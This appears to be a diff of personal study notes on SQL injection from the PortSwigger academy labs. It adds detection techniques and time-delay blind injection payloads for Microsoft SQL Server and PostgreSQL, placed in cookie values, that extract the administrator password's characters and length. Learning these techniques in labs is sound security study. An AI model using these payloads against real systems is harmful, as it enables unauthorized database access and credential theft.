@@ -1,8 +1,31 @@
-# Web Hacking
+# SQL Injection
 
 These are notes that I compiled while learning from the Portswigger academy. The code is from them, although I will modify them according to my needs.
 
 ## SQL Injection
+
+### How to detect SQL injection vulnerabilities <a href="#how-to-detect-sql-injection-vulnerabilities" id="how-to-detect-sql-injection-vulnerabilities"></a>
+
+* Submitting the single quote character `'` and looking for errors or other anomalies.
+* Submitting some SQL-specific syntax that evaluates to the base (original) value of the entry point, and to a different value, and looking for systematic differences in the resulting application responses.
+* Submitting Boolean conditions such as `OR 1=1` and `OR 1=2, and` looking for differences in the application's responses.
+* Submitting payloads designed to trigger time delays when executed within an SQL query, and looking for differences in the time taken to respond.
+* Submitting OAST payloads designed to trigger an out-of-band network interaction when executed within an SQL query, and monitoring for any resulting interactions.
+
+### Database-specific factors <a href="#database-specific-factors" id="database-specific-factors"></a>
+
+* Syntax for string concatenation.
+* Comments.
+* Batched (or stacked) queries.
+* Platform-specific APIs.
+* Error messages.
+
+### SQL injection in different parts of the query <a href="#sql-injection-in-different-parts-of-the-query" id="sql-injection-in-different-parts-of-the-query"></a>
+
+* In `UPDATE` statements, within the updated values or the `WHERE` clause.
+* In `INSERT` statements, within the inserted values.
+* In `SELECT` statements, within the table or column name.
+* In `SELECT` statements, within the `ORDER BY` clause.
 
 ### **Retrieving hidden data**
 
@@ -239,7 +262,7 @@ To test for Oracle databases:
 
 If you do not get an error with the above query, then the DB is Oracle. To make sure SQL query is being processed in the backend, run the following:
 
-Cookie: TrackingId=jtQxp6BAmmb6pemr'||(SELECT '' FROM not-a-real-table)||'
+`Cookie: TrackingId=jtQxp6BAmmb6pemr'||(SELECT '' FROM not-a-real-table)||'`
 
 To verify that a users table exists:
 
@@ -271,3 +294,31 @@ Again, for this one the error lets you know when you are on the right path:
 
 ![](<../.gitbook/assets/image (339).png>)
 
+### Exploiting blind SQL injection by triggering time delays <a href="#exploiting-blind-sql-injection-by-triggering-time-delays" id="exploiting-blind-sql-injection-by-triggering-time-delays"></a>
+
+This method is for when the application catches database errors and handles them. The previous example will not work, since we will not get a notification of the error. The following examples are for Microsoft SQL Database:
+
+`'; IF (1=2) WAITFOR DELAY '0:0:10'-- //no delay, since it's FALSE`\
+`'; IF (1=1) WAITFOR DELAY '0:0:10'-- //delay, since it is TRUE`
+
+Example:
+
+`'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--`
+
+Use Case:
+
+`Cookie: TrackingId=IlAzXVbrp933YGHp'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:10'--;`
+
+For PostgreSQL:
+
+If you use ";", you get an error, but if it is encoded, then you are allowed to query. The following query does NOT work:
+
+`Cookie: TrackingId=O6fRvnQwwVzqOXwY';SELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--;`
+
+This one does:
+
+`Cookie: TrackingId=O6fRvnQwwVzqOXwY'%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--;`
+
+PostgreSQL find size of password (assuming there is a password column):
+
+`Cookie: TrackingId=O6fRvnQwwVzqOXwY'%3BSELECT+CASE+WHEN+(username='administrator'+AND+LENGTH(password)>1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
